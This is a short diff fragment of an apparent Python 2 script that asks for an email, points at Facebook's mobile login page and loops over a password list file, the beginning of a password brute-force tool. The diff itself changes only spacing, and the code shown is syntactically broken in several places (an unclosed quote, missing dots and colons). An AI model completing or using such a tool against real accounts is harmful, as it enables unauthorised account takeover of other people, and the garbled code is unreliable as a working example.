@@ -2,10 +2,10 @@ import requests
 import sys
 
 
-email = raw_input ("email>> ")
+email =raw_input ("email>> ")
 url='https://free.facebook.com/login.php'
 
-ex = open('pass.txt, 'r') readlines()
+ex =open('pass.txt, 'r') readlines()
 
 for line in ex
       password: line,strip()
